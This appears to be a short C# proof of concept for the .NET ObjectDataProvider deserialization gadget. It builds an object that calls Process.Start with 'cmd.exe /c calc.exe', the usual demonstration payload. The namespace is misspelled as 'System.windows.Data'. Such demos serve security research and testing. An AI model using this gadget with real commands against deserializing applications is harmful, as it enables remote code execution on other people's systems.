using System.windows.Data;
using System.Diagnostics;

namespace ODP_gadget
{
	class Test
	{
		static void Main(string[] args)
		{
			ObjectDataProvider pay = new ObjectDataProvider();
			pay.ObjectType = typeof(Process);
			pay.MethodParameters.Add("cmd.exe");
			pay.MethodParameters.Add("/c calc.exe");
			pay.MethodName = "Start";
		}
	}
}
